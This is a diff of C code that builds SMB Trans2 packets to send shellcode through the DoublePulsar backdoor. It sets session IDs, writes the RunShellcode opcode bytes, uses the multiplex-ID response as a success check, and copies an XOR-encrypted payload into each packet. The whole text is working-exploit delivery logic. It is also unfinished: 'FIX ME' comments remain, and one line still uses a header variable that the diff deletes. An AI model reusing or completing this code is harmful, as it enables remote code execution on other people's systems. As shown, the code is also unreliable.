@@ -264,25 +264,27 @@ int main(int argc, char* argv[])
 	encrypted_buffer_len = sizeof(encrypted);
 	for (ctx = 0; ctx <= encrypted_buffer_len; ctx++)
 	{
-		unsigned char SMB_Trans2_Packet_Header[] = "__INSERT__TRANS2_PACKET__DATA__HERE";
-		memcpy(big_packet, SMB_Trans2_Packet_Header, sizeof(SMB_Trans2_Packet_Header));
-		memcpy(big_packet + sizeof(SMB_Trans2_Packet_Header), trans2_request, sizeof(trans2_request));
+		memcpy(big_packet, trans2_request, sizeof(trans2_request));
 
 		//update TreeId, UserID, ProcessID & MultiplexID in packet
 		memcpy(big_packet + 28, (char*)&treeid, 2);
 		memcpy(big_packet + 30, (char*)&processid, 2);
 		memcpy(big_packet + 32, (char*)&userid, 2);
 		//memcpy(big_packet + 34, (char*)&multiplexid, 2);
+		//update multiplex id to 41
+		//if doublepulsar is successful, it will increment by 10
+		//if x51 is returned then success it ran!
+		big_packet[34] = '\x41';
 
 		//update Timeout for RunShellcode
-		big_packet[34] = '\x41'; //update multiplex id
-
 		//25 89 1a 00 is the opcode for RunShellcode & DLL
 		big_packet[49] = '\x25';
 		big_packet[50] = '\x89';
 		big_packet[51] = '\x1a';
 		big_packet[52] = '\x00';
-
+		
+		//fix me
+		//copy 4064 bytes at a time from the XOR encrypted buffer
 		memcpy(big_packet + sizeof(SMB_Trans2_Packet_Header) + sizeof(trans2_request), (char*)encrypted, sizeof(encrypted));
 
 		//FIX ME
